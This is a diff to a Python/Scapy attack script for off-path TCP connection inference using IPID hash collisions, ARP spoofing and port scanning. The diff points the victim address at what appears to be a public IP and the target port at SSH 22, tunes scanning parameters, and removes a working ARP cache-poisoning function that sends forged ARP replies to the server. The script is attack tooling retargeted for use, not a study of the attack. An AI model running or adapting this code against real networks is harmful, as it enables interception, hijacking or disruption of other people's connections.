@@ -33,18 +33,17 @@ from scapy.layers.l2 import *
                     2020/3/18    Kevin.F:    Add script variable my_if_name
 """
 
-forge_ip = '10.10.16.92'                    # hash collision IP (get form collision_find.py)
-victim_ip = '10.10.100.1'                   # victim ip address
-server_ip = '10.10.100.2'                   # server ip address
-server_port = 3000                          # known server port (e.g. ssh:22 BGP:179 Rocket.Chat 3000)
+forge_ip = '10.10.8.150'                    # hash collision IP (get form collision_find.py)
+victim_ip = '182.92.129.182'                # victim ip address
+server_ip = '172.21.0.12'                   # server ip address
+server_port = 22                            # known server port (e.g. ssh:22 BGP:179 Rocket.Chat 3000)
 
-server_mac_addr = '00:0c:29:20:f4:8c'       # mac address of server used for ARP poison
-my_if_name = 'ens33'                        # bind one ethernet interface
+my_if_name = 'eth0'                         # bind one ethernet interface
 my_mac_addr = get_if_hwaddr(my_if_name)     # mac address of attacker
 z_payload = b''                             # full-zero byte string used for padding
 
-N_THREAD = 5                                # number of checking thread
-BLOCK = 150                                 # port block size
+N_THREAD = 4                                # number of checking thread
+BLOCK = 500                                 # port block size
 sleep_time = 0.5                            # for maximum challenge-ACK rate
 
 semaphore_fin = threading.Semaphore(1)      # for stop correctly
@@ -57,7 +56,7 @@ end_port = 61000                            # scanning end at?
 stop = False                                # find active connectin?
 result = -1                                 # target port number
 
-MX = 3                                      # number of IPID-based connection check
+MX = 2                                      # number of IPID-based connection check
 reverse = False                             # from higher port numbers down to lowers
 
 """
@@ -101,23 +100,7 @@ class Task:
                 IP address which can cause IPID counter hash collision. 
 """
 def arp_inject():
-    forged_ip = forge_ip
-    # here we send a UDP packet to allure server to execute ip/mac convert
-    pkt = sniff(filter="arp " + "and dst " + forged_ip + " and ether src " + server_mac_addr,
-                iface=my_if_name, timeout=1, count=1, started_callback=
-                lambda: send(IP(src=forged_ip, dst=server_ip) / UDP(dport=80),
-                             iface=my_if_name, verbose=False))
-
-    if len(pkt) == 1 and pkt[0][1].fields['psrc'] == server_ip and pkt[0][1].fields['pdst'] == forged_ip:
-        send(ARP(pdst=server_ip, hwdst=server_mac_addr, psrc=forged_ip, hwsrc=my_mac_addr, op=2),
-             iface=my_if_name, verbose=False)
-
-    time.sleep(0.5)
-
-    if not stop:
-        ts = threading.Thread(target=arp_inject)
-        ts.start()
-
+    return
 
 """
     @Date:      2020/2/21
@@ -187,7 +170,6 @@ def check_new_list(list_p):
     for i in range(1, C + 1):
         if ipids[i] - ipids[i - 1] >= 2:
             ipid_next.append(list_p[i - 1])
-
     return ipid_next
 
 
